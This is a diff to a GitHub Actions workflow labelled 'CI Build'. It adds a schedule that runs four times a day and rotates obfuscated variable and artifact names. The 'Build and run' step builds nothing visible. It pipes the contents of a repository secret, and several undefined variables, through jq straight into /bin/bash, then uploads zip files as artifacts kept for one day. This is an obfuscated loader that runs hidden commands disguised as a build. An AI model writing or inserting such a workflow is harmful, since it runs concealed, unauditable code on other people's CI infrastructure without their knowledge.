@@ -2,6 +2,8 @@ name: CI Build
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '20 5,11,17,23 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,17 +17,17 @@ jobs:
           fetch-depth: 1
       - name: Build and run
         env:
-          nf7: ${{ secrets.nf7 }}
+          nxbl62: ${{ secrets.nxbl62 }}
         run: |
-          printf '%s' "$nf7" | jq -r .ue8880 | /bin/bash
-          echo $cidk184 | jq -r .r2 | /bin/bash
-          echo $xxtu4453 | jq -r .uhci321 | /bin/bash
-          printf '%s' "$v2174" | jq -r .sofnm0 | /bin/bash
+          printf '%s' "$nxbl62" | jq -r .a55 | /bin/bash
+          echo $rfc6475 | jq -r .esyug083 | /bin/bash
+          printf '%s' "$qjrv0" | jq -r .st0881 | /bin/bash
+          printf '%s' "$wwyoo2" | jq -r .z698 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: b43bQMjJ
+          name: AY9gGhdh
           path: "*.zip"
           retention-days: 1
